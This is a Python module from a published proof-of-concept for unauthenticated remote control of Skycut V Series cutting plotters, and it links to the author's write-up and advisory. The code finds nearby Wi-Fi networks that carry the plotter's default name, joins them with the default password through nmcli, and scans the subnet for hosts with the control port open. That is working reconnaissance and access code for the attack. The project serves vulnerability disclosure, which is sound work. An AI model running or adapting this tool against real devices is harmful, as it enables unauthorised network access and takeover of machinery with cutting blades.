# Module: network_scanner.py
# Part of the Skycut V Series Cutting Plotter Unauthenticated Remote Control
# Author: Omar Elshopky (omarelshopky.com)
#
# Full Write-up: https://medium.com/@omarelshopky/wireless-weapons-turning-skycut-plotters-into-physical-dangers-9f29e0cd357a
# Advisory: https://github.com/omarelshopky/skycut-v-series-cutting-plotter-unauth-remote-control-poc

import socket
import subprocess
from ipaddress import ip_network, ip_address
from config import DEFAULT_WIFI_NAME_NIDDLE, DEFAULT_WIFI_PASSWORD, DEFAULT_PORT, DEFAULT_IP
from colorama import Fore
import concurrent.futures


class NetworkScanner:
    def find_plotter_wifi_ssids(self):
        print(Fore.CYAN + "[*] Scanning for nearby Wi-Fi networks...")
        ssids = self._get_nearby_wifi_ssids()
        print(Fore.GREEN + f"[+] Found {len(ssids)} networks")

        matching_ssids = {
            ssid for ssid in ssids if DEFAULT_WIFI_NAME_NIDDLE in ssid
        }

        if matching_ssids:
            print(Fore.GREEN + f"[+] Found {len(matching_ssids)} matching SSID(s) containing '{DEFAULT_WIFI_NAME_NIDDLE}':")
            for ssid in matching_ssids:
                print(Fore.GREEN + f"    - {ssid}")
        else:
            print(Fore.RED + "[-] No matching SSIDs found")

        return list(matching_ssids)

    def connect_to_wifi(self, ssid, password=DEFAULT_WIFI_PASSWORD):
        print()
        print(Fore.CYAN + f"[*] Attempting to connect to Wi-Fi network '{ssid}'...")

        result = subprocess.run(
            ["nmcli", "dev", "wifi", "connect", ssid, "password", password],
            capture_output=True
        )

        if result.returncode == 0:
            print(Fore.GREEN + f"[+] Successfully connected to '{ssid}'")

            return True
        else:
            print(Fore.RED + f"[-] Failed to connect to '{ssid}'")
            print(Fore.RED + f"    stderr: {result.stderr.decode().strip()}")

            return False
    
    def scan_live_ips(self):
        print(Fore.CYAN + "[*] Detecting current IP and subnet...")
        current_ip = self._get_current_ip()
        if not current_ip:
            print(Fore.RED + "[-] Unable to determine local IP address")
            return []

        subnet = self._get_subnet(current_ip)
        print(Fore.CYAN + f"[*] Scanning subnet: {subnet} for IPs with port {DEFAULT_PORT} open")

        ip_list = list(ip_network(subnet).hosts())
        # Start scanning from DEFAULT_IP
        ip_list.sort(key=lambda ip: ip != ip_address(DEFAULT_IP))

        open_hosts = []

        def scan(ip):
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
                sock.settimeout(0.5)
                try:
                    sock.connect((str(ip), DEFAULT_PORT))
                    print(Fore.GREEN + f"[+] Port {DEFAULT_PORT} open on {ip}")
                    return str(ip)
                except:
                    return None

        with concurrent.futures.ThreadPoolExecutor(max_workers=50) as executor:
            results = executor.map(scan, ip_list)

        for host in results:
            if host:
                open_hosts.append(host)

        if not open_hosts:
            print(Fore.RED + f"[-] No IPs with port {DEFAULT_PORT} open found")

        return open_hosts

    def _get_nearby_wifi_ssids(self):
        try:
            result = subprocess.run(
                ["nmcli", "-f", "SSID", "dev", "wifi"],
                capture_output=True,
                text=True,
                check=True
            )

            ssids = [
                line.strip() for line in result.stdout.splitlines()
                if line.strip() and line.strip().lower() != "ssid"
            ]
            return ssids

        except subprocess.CalledProcessError as e:
            print(Fore.RED + "[-] Error fetching Wi-Fi networks:")
            print(Fore.RED + f"    {e}")
            return []

    def _get_current_ip(self):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            ip = s.getsockname()[0]
            s.close()

            return ip
        except Exception as e:
            print(Fore.RED + f"[-] Error getting current IP: {e}")

            return None

    def _get_subnet(self, ip, cidr=24):
        return f"{ip.rsplit('.', 1)[0]}.0/{cidr}"
